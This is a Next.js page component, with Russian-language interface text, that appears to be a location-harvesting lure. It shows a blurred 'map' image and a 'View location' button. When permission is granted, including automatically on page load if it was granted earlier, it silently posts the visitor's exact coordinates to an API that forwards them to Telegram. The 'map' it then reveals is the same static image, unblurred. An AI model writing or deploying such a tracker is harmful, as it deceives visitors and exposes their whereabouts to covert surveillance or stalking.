"use client";

import Image from "next/image";
import { useEffect, useState } from "react";

export default function Home() {
  const [location, setLocation] = useState<{ lat: number; lon: number } | null>(
    null
  );
  const [geoDenied, setGeoDenied] = useState(false);

  const requestLocation = () => {
    if (!("geolocation" in navigator)) {
      alert("Геолокация не поддерживается вашим браузером");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        setLocation({ lat, lon });
        setGeoDenied(false);

        // отправляем координаты в API
        try {
          const res = await fetch("/api/sendMessage", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ lat, lon }),
          });

          const data = await res.json();
          if (data.ok)
            console.log("✅ Геолокация успешно отправлена в Telegram");
          else console.log("❌ Ошибка при отправке:", data.error);
        } catch (error) {
          console.log(error);
        }
      },
      (error) => {
        console.log("Ошибка получения геолокации:", error);
        if (error.code === 1) setGeoDenied(true); // пользователь запретил доступ
      }
    );
  };

  // Проверка разрешений при монтировании
  useEffect(() => {
    if (!("permissions" in navigator)) return;

    navigator.permissions.query({ name: "geolocation" }).then((status) => {
      if (status.state === "granted") requestLocation();
      if (status.state === "denied") setGeoDenied(true);
      // prompt — пользователь ещё не решал
    });
  }, []);

  return (
    <div className="w-full mx-auto">
      <div className="max-w-[500px] max-h-[500px] mx-auto text-center">
        {!location ? (
          <div>
            <Image
              src={"/1.jpg"}
              width={500}
              height={500}
              alt="map placeholder"
              className="blur-lg"
            />
            {geoDenied && (
              <p className="mt-3 text-red-600">
                Вы запретили доступ к геолокации. Разрешите в настройках
                браузера.
              </p>
            )}
            <button
              className="mt-5 px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 transition"
              onClick={requestLocation} // повторный запрос
            >
              Посмотреть местоположение
            </button>
          </div>
        ) : (
          <Image src={"/1.jpg"} width={500} height={500} alt="map" />
        )}
      </div>
    </div>
  );
}
